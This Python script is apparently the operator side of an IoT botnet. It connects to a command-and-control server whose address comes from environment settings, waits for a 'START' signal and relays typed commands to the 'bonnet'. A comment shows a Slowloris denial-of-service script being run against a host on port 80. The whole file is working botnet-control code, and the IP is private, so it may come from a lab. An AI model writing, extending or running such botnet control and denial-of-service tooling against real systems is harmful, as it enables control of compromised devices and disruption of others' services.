import socket

from Env import Env

env = Env()

server = str(env.get(key="cncIp"))
port = int(env.get(key="cncPort"))


# python3 /home/kabali/IotBot/slowLoris.py 10.0.0.36 80


bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bot.connect((server, port))

try:
    while True:
        resp = bot.recv(2040).decode("UTF-8")

        if resp.find('START') != -1:
            print("Enter the command for bonnet")
            cmd = input()
            bot.send(bytes('CMD :' + cmd + '\r\n', "UTF-8"))
except KeyboardInterrupt:
    print("Press Ctrl-C to terminate while statement")
    bot.close()

